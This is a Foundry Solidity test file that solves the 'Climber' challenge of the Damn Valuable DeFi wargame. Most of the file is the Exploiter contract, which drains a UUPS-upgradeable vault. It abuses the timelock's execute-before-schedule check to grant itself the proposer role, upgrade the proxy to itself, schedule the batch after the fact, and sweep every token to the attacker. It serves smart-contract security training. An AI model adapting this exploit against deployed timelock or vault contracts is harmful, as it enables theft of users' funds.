// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        vm.label(deployer, "Deployer");
        proposer = payable(users[1]);
        vm.label(proposer, "proposer");
        sweeper = payable(users[2]);
        vm.label(sweeper, "sweeper");

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );
        vm.label(address(climberTimelock), "ClimberTimelock");

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(attacker);

        Exploiter exploiter = new Exploiter(
            dvt,
            climberTimelock,
            climberImplementation,
            climberVaultProxy
        );
        exploiter.attack();

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}

contract Exploiter is Test, UUPSUpgradeable {
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address internal attacker;

    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        DamnValuableToken _dvt,
        ClimberTimelock _climberTimelock,
        ClimberVault _climberImplementation,
        ERC1967Proxy _climberVaultProxy
    ) payable {
        dvt = _dvt;
        climberTimelock = _climberTimelock;
        climberImplementation = _climberImplementation;
        climberVaultProxy = _climberVaultProxy;
        attacker = msg.sender;
    }

    function attack() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);
        bytes32 salt = hex"";

        (targets, values, data, salt) = getPayload();

        climberTimelock.execute(targets, values, data, salt);
    }

    function attackSchedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);
        bytes32 salt = hex"";

        (targets, values, data, salt) = getPayload();

        climberTimelock.schedule(targets, values, data, salt);
    }

    function getPayload()
        internal
        returns (
            address[] memory,
            uint256[] memory,
            bytes[] memory,
            bytes32
        )
    {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);
        bytes32 salt = hex"";

        //1. Need to pass hasRole() modifier
        targets[0] = address(climberTimelock);
        values[0] = 0;
        data[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        //2. Upgrade implementation contract to this
        targets[1] = address(climberVaultProxy);
        values[1] = 0;
        data[1] = abi.encodeWithSignature("upgradeTo(address)", address(this));

        //3. Make sure schedule() is called so that ClimberTimelock:114 doesn't mess this up
        targets[2] = address(this);
        values[2] = 0;
        data[2] = abi.encodeWithSignature("attackSchedule()");

        //4. Sweep the proxy
        targets[3] = address(climberVaultProxy);
        values[3] = 0;
        data[3] = abi.encodeWithSignature(
            "sweepFunds(address,address)",
            address(dvt),
            attacker
        );

        return (targets, values, data, salt);
    }

    function sweepFunds(address token, address target) external {
        DamnValuableToken(token).transfer(
            target,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
